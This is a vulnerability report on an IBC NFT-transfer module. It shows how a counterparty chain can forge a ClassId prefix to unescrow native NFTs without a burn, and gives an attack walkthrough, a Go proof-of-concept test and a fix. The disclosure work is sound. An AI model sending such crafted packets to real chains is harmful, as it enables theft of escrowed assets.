### Title
Malicious IBC Counterparty Can Unescrow Native NFTs Without Corresponding Burn via Crafted `ClassId` â€” (`x/nft-transfer/keeper/packet.go`, `x/nft-transfer/types/trace.go`)

---

### Summary

`processReceivedPacket` determines whether to mint vouchers or unescrow native NFTs by calling `IsAwayFromOrigin(packet.GetSourcePort(), packet.GetSourceChannel(), data.ClassId)`. Because `data.ClassId` is attacker-controlled and `IsAwayFromOrigin` only checks whether `data.ClassId` starts with the packet's own source port/channel prefix â€” a prefix the counterparty chain always controls â€” a malicious counterparty can force the unescrow branch to execute, draining native NFTs from the escrow account without any corresponding burn on the sending chain.

---

### Finding Description

**`IsAwayFromOrigin` logic:** [1](#0-0) 

```go
func IsAwayFromOrigin(sourcePort, sourceChannel, fullClassPath string) bool {
    prefixClassID := GetClassPrefix(sourcePort, sourceChannel)
    return !strings.HasPrefix(fullClassPath, prefixClassID)
}
```

`GetClassPrefix` returns `sourcePort + "/" + sourceChannel + "/"`. The function returns `false` (i.e., "returning to origin") whenever `fullClassPath` starts with the source port/channel prefix.

**`processReceivedPacket` unescrow branch:** [2](#0-1) 

When `isAwayFromOrigin == false`, the code strips the source prefix from `data.ClassId`, resolves the resulting `voucherClassID`, and calls `TransferOwner(ctx, voucherClassID, tokenID, escrowAddress, receiver)` where `escrowAddress = GetEscrowAddress(packet.GetDestPort(), packet.GetDestChannel())`.

**The flaw:** `data.ClassId` is fully attacker-controlled (it comes from the counterparty chain's packet payload). `ValidateBasic` performs no structural validation of `ClassId` beyond non-empty: [3](#0-2) 

A malicious counterparty chain can always craft a `ClassId` that begins with its own `sourcePort + "/" + sourceChannel + "/"` prefix, because those are the counterparty's own identifiers. This unconditionally forces `IsAwayFromOrigin` to return `false`.

---

### Impact Explanation

**Concrete attack path:**

1. User on victim chain B sends native NFT `nativeClass/tokenX` to malicious chain C via channel `channel-1` (B's side) / `channel-X` (C's side). `createOutgoingPacket` escrows the NFT to `GetEscrowAddress("nft", "channel-1")` on chain B.

2. Malicious chain C crafts a packet back to chain B:
   - `SourcePort = "nft"`, `SourceChannel = "channel-X"` (C's own identifiers)
   - `data.ClassId = "nft/channel-X/nativeClass"` (starts with C's own prefix)
   - `data.TokenIds = ["tokenX"]`
   - `data.Receiver = attacker_address`

3. On chain B, `processReceivedPacket` evaluates:
   - `IsAwayFromOrigin("nft", "channel-X", "nft/channel-X/nativeClass")` â†’ `false`
   - `unprefixedClassID = RemoveClassPrefix("nft", "channel-X", "nft/channel-X/nativeClass")` â†’ `"nativeClass"`
   - `voucherClassID = ParseClassTrace("nativeClass").IBCClassID()` â†’ `"nativeClass"` (empty path)
   - `escrowAddress = GetEscrowAddress("nft", "channel-1")` â€” the address holding the escrowed NFT
   - `TransferOwner(ctx, "nativeClass", "tokenX", escrowAddress, attacker_address)` â€” **succeeds** [4](#0-3) 

`TransferOwner` in the NFT keeper verifies only that `srcOwner` currently owns the token: [5](#0-4) 

All conditions are satisfied: the denom exists, the token exists, and the escrow address is the current owner. The transfer succeeds. Chain C retains the voucher it minted in step 1 and has also received the native NFT back â€” a double-spend of the escrow.

---

### Likelihood Explanation

Any IBC-connected counterparty chain that has received at least one native NFT from chain B (creating an escrow balance) can execute this attack. The malicious chain controls its own packet data entirely. No special privileges, governance, or key compromise are required â€” only a live IBC channel and at least one escrowed NFT on the victim chain. The IBC channel handshake authenticates the counterparty but does not constrain the content of `data.ClassId`.

---

### Recommendation

`processReceivedPacket` must verify that the `ClassId` in the incoming packet was actually registered as a class trace by the receiving chain when it originally sent the NFT outbound. Specifically, before executing the unescrow branch, the code should confirm that a class trace record exists for the full path `sourcePort/sourceChannel/...` and that it was created by the receiving chain's own outbound transfer â€” not merely that the string starts with the source prefix. One concrete fix: look up the class trace by hash in the receiving chain's store and reject the packet if no matching trace exists for the claimed `unprefixedClassID` under the receiving chain's escrow.

---

// Keeper integration test sketch
func TestMaliciousUnescrow(t *testing.T) {
    // 1. Pre-escrow a native NFT to the escrow address for (destPort="nft", destChannel="channel-1")
    escrowAddr := types.GetEscrowAddress("nft", "channel-1")
    nftKeeper.IssueDenom(ctx, "nativeClass", ...)
    nftKeeper.MintNFT(ctx, "nativeClass", "tokenX", ..., escrowAddr, escrowAddr)

    // 2. Craft a malicious packet from counterparty (sourcePort="nft", sourceChannel="channel-X")
    //    with ClassId starting with "nft/channel-X/" â€” the counterparty's own prefix
    data := types.NonFungibleTokenPacketData{
        ClassId:   "nft/channel-X/nativeClass", // crafted: starts with sourcePort/sourceChannel/
        TokenIds:  []string{"tokenX"},
        TokenUris: []string{"uri"},
        Sender:    legitimateSender.String(),
        Receiver:  attackerAddr.String(),
    }
    packet := channeltypes.Packet{
        SourcePort:      "nft",
        SourceChannel:   "channel-X",  // counterparty's channel
        DestinationPort: "nft",
        DestinationChannel: "channel-1", // victim chain's channel
        Data: data.GetBytes(),
    }

    // 3. processReceivedPacket: IsAwayFromOrigin("nft","channel-X","nft/channel-X/nativeClass") = false
    //    â†’ unescrow branch â†’ TransferOwner("nativeClass","tokenX", escrowAddr, attackerAddr)
    err := keeper.OnRecvPacket(ctx, types.Version, packet, data)
    require.NoError(t, err)

    // 4. Assert: attacker now owns the native NFT; escrow account has lost it
    nft, _ := nftKeeper.GetNFT(ctx, "nativeClass", "tokenX")
    require.Equal(t, attackerAddr.String(), nft.GetOwner().String())
    // Chain C still holds its voucher â€” invariant broken
}

func (k Keeper) TransferOwner(
	ctx sdk.Context, denomID, tokenID string, srcOwner, dstOwner sdk.AccAddress,
) error {
	if !k.HasDenomID(ctx, denomID) {
		return sdkerrors.Wrapf(types.ErrInvalidDenom, "denom ID %s not exists", denomID)
	}

	nft, err := k.IsOwner(ctx, denomID, tokenID, srcOwner)
	if err != nil {
		return err
	}

	nft.Owner = dstOwner.String()

	k.setNFT(ctx, denomID, nft)
	k.swapOwner(ctx, denomID, tokenID, srcOwner, dstOwner)
	return nil
}
